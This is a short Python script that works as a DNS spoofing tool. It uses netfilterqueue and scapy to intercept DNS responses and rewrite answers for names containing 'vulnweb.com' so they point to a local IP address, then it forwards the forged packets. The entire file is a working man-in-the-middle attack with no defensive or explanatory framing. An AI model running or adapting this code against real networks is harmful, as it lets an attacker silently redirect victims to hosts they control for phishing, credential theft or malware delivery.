import netfilterqueue
import scapy.all as scapy
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if b"vulnweb.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.163.179")
            scapy_packet[scapy.DNS].an=answer
            scapy_packet[scapy.DNS].ancount=1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
          
            packet.set_payload(bytes(scapy_packet))
    packet.accept()

queue=netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()